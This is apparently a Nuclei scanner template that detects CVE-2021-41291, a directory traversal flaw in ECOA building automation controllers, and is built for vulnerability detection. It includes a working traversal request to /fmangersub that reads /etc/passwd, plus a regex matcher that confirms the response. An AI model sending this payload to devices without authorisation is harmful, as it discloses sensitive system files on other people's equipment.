id: CVE-2021-41291

info:
  name: ECOA Building Automation System - Directory Traversal Content Disclosure
  author: gy741
  severity: high
  description: The ECOA BAS controller suffers from a directory traversal content disclosure vulnerability. Using the GET parameter cpath in File Manager (fmangersub), attackers can disclose directory content on the affected device
  impact: |
    An attacker can exploit this vulnerability to access sensitive files and directories, potentially exposing sensitive information.
  remediation: |
    Apply the latest security patches or updates provided by the vendor to fix the directory traversal vulnerability in the ECOA Building Automation System.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2021-41291
    - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5670.php
    - https://www.twcert.org.tw/en/cp-139-5140-6343c-2.html
    - https://www.twcert.org.tw/tw/cp-132-5127-3cbd3-1.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2021-41291
    cwe-id: CWE-22
    epss-score: 0.03741
    epss-percentile: 0.90901
    cpe: cpe:2.3:o:ecoa:ecs_router_controller-ecs_firmware:-:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: ecoa
    product: ecs_router_controller-ecs_firmware
  tags: cve,cve2021,ecoa,lfi,traversal

http:
  - raw:
      - |
        GET /fmangersub?cpath=../../../../../../../etc/passwd HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"
# digest: 4a0a00473045022022d555bc3f865bbf9d2b7af020d2eed7d2a3c7815175f0b88d94b95d5fb87bc80221009fac52b5efe267f192076bb01b799a54d8ee8d4c133aa9da101ca169cf73ba75:922c64590222798bb761d5b6d8e72950